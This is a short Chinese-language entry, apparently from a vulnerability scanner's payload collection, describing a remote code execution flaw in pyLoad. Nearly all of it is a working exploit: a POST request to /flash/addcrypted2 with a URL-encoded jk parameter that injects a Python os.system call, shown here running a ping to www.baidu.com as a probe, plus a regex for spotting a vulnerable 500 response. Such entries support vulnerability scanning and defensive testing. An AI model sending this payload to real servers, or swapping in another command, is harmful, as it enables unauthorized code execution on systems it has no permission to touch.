# pyLoad远程代码执行漏洞

pyLoad ｜ 命令执行 ｜ —
- **请求**：`POST /flash/addcrypted2 HTTP/1.1`

**Payload**
```
jk=pyimport%20os;os.system("ping%20www.baidu.com");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
```
- **响应特征**：500 ^(?=.*?Could)(?=.*?key).*?$